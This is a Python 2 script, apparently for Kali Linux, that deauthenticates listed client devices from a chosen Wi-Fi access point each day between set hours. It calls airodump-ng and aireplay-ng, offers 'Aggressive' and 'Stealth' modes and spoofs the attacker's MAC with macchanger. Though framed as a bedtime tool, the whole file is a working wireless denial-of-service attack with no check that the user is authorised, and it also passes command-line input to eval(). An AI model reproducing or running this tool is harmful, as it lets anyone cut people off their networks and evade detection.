#!/usr/bin/env python
#
# Deauthenticates Clients From A Network (Setting Up a Bed Time. The Hard Way)
#
import os
import sys
import time
import argparse
import datetime
from subprocess import *
from threading import Thread

class Engine(object):
 def __init__(self,mac,channel,wlan,mode,s_hr,s_min,e_hr,e_min):
  self.state = None # Off/On
  self.bssid = mac     
  self.wlan  = wlan
  self.mode  = mode
  self.s_hr  = s_hr
  self.e_hr  = e_hr
  self.s_min = s_min
  self.e_min = e_min
  self.chan  = channel
  self.delay = 30  if mode == 'S' else 57

 def Monitor(self):
  call(['ifconfig',self.wlan,'down'])
  call(['iwconfig',self.wlan,'mode','monitor'])
  Popen(['macchanger','-r',self.wlan],stdout=Devnull,stderr=Devnull)
  call(['ifconfig',self.wlan,'up'])
  call(['service','network-manager','stop'])

 def Managed(self):
  call(['ifconfig',self.wlan,'down'])
  call(['iwconfig',self.wlan,'mode','managed'])
  Popen(['macchanger','-p',self.wlan],stdout=Devnull,stderr=Devnull)
  call(['ifconfig',self.wlan,'up'])
  call(['service','network-manager','restart'])
  exit()

 def Scan(self):
  cmd=['airodump-ng','--output-format','csv','--bssid',self.bssid,'-c',self.chan,'-w','list',self.wlan]
  Popen(cmd,stderr=Devnull,stdout=Devnull)
  
 def Attack(self,client):
  cmd=['aireplay-ng','-0','1','-a',self.bssid,'-c',client,'--ignore-negative-one',self.wlan]
  Popen(cmd,stdout=Devnull,stderr=Devnull).wait()

 def now(self):
  time=str(datetime.datetime.now()).split()[1][:5]
  return int(time[:2]),int(time[3:])

 def status(self,current):
  hrs,mins=current[0],current[1]
  if hrs==eval(self.s_hr) and mins==eval(self.s_min):return True
  if hrs==eval(self.e_hr) and mins==eval(self.e_min):return False 

def from_file_to_list(file):
 list=[]
 # Verify blacklist
 if not os.path.exists(file):
  call(['clear'])
  exit('[!] Unable to locate: {}'.format(file))

 with open(file,'r') as _file:
  for item in _file:
   if ':' in item:
    new_item=item.strip()
    new_item.replace('\n','')
    list.append(new_item)

 if not len(list):
  call(['clear'])
  exit('[!] Unable to find mac addresses in: {}'.format(file))
 return list

def main():
 # Assign Arugments
 UserArgs = argparse.ArgumentParser() 
 UserArgs.add_argument('interface', help='wireless interface')
 UserArgs.add_argument('mac',       help='bssid of router')
 UserArgs.add_argument('mode',      help='[A]ggressive [S]tealth') # Aggressive: 15 sec; Stealth: 60 sec
 UserArgs.add_argument('channel',   help='channel of router')
 UserArgs.add_argument('blacklist', help='path to blacklist with mac addresses')
 UserArgs.add_argument('start',     help='time to start attack each day; Military Time; Enter 15:07')
 UserArgs.add_argument('end',       help='time to stop  attack each day; Military Time; Enter 17:15')
 Args = UserArgs.parse_args()
 
 # Assign Variables
 list  = Args.blacklist if Args.blacklist else Args.blacklist
 mode  = Args.mode[0].upper() if Args.mode else Args.mode
 mode  = 'S' if mode != 'A' and mode != 'S' else mode
 blist = from_file_to_list(list)
 wlan  = Args.interface
 chan  = Args.channel
 macs  = Args.mac
 mode  = mode[0]
 alive = False
 #
 blist=[mac for mac in blist]
 s_hr,s_min,e_hr,e_min=Args.start[:2],Args.start[3:],Args.end[:2],Args.end[3:]
 engine = Engine(macs,chan,wlan,mode,s_hr,s_min,e_hr,e_min)  

 # Enable Monitor Mode
 engine.Monitor()
 
 # Change Directory
 os.chdir('/tmp')

 # Start Proc
 while 1:
  try:
   engine.state=engine.status(engine.now())
   if engine.state==None:msg=True if alive else False
   if engine.state==True:
    call(['clear'])
    print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(engine.state,e_hr,e_min)
   elif engine.state==False:
    call(['clear'])
    print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(engine.state,s_hr,s_min)
    time.sleep(.4)
    Popen(['pkill','airodump-ng']).wait()
   else:
    call(['clear'])
    print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(msg,s_hr,s_min)
    time.sleep(.4)

   if engine.state:
    if not alive:engine.Scan();time.sleep(8);alive=True
   if engine.state==False:
    if alive:Popen(['pkill','airodump-ng']).wait();alive=False
    
   if alive:
    for i,client in enumerate(blist):
     if i!=len(blist)-1:engine.Attack(client);continue
     bot=Thread(target=engine.Attack,args=[client])
     bot.start()
     while bot.is_alive():pass
    time.sleep(engine.delay)   
  except KeyboardInterrupt:
   call(['clear'])
   Popen(['pkill','airodump-ng']).wait()
   Popen(['pkill','aireplay-ng']).wait()
   for i in range(2):engine.Managed()

if __name__ == '__main__':
 # Filters
 if sys.platform != 'linux2':
  exit('[-] Kali Linux 2.0 Required!')

 if os.getuid():
  exit('[-] Root Access Required!')

 Devnull = open(os.devnull,'w')
 # Start 
 main()
